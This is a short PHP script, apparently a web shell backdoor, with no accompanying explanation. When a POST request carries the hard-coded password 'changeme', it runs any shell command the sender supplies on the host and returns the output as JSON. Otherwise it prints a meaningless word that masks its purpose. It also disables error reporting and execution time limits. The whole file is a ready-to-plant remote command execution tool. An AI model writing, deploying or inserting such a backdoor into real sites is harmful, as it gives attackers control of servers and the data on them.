<?php
set_time_limit(0);
ini_set("max_execution_time", 0);
error_reporting(false);

if($_POST["pass"] === "changeme" && isset($_POST["cmd"]) && isset($_POST["cwd"])) {
    $cmd = $_POST["cmd"];
    $cwd = $_POST["cwd"];
    $out = shell_exec("cd " . $cwd . "; " . $cmd . " 2>&1; echo -CWD##$(pwd)");
    $cwd = str_replace("\n", "", explode("-CWD##", $out)[1]);

    $out = explode("-CWD##", $out)[0];

    $json = new stdClass();
    $json->cwd = $cwd;
    $json->out = $out;

    echo json_encode($json);
} else {
    echo "elnof";
}
?>